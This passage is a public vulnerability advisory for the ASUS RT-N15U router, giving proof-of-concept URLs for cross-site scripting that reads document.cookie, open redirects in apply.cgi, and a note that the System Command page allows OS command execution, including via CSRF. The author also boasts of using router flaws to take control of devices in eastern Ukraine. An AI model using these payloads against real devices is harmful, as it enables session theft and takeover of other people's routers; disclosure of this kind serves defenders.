are Code Execution, Cross-Site Scripting and URL Redirector Abuse
vulnerabilities.

-------------------------
Affected products:
-------------------------

Vulnerable is the next model: ASUS RT-N15U with different versions of
firmware. I checked in RT-N15U with firmware version 1.9.2.7.

Since Asus ignored vulnerabilities in their notebook, which I sent them in
2009, and all vulnerabilities in RT-G32, which I sent them during 2015, so I
publish these vulnerabilities publicly.

Details:

Code Execution (OS Commanding) (WASC-31):

In section System Command it&#039;s possible to execute system commands. The code
also can be executed via CSRF attack.

cat /proc/version

Cross-Site Scripting (WASC-08):

http://site/apply.cgi?current_page=javascript:alert(document.cookie) (in old
browsers)

http://site/apply.cgi?current_page=%22%3E%3Cbody%20onload=alert%28document.cookie%29%3E

URL Redirector Abuse (WASC-38):

http://site/apply.cgi?current_page=http://google.com

http://site/apply.cgi?next_host=http://google.com

I found this and other routers in 2014-2015 to take control over terrorists
in Crimea, Donetsk and Lugansks regions of Ukraine. Read about it in list
(http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2015-November/009125.html).

I mentioned about these vulnerabilities at my site
(http://websecurity.com.ua/8059/).
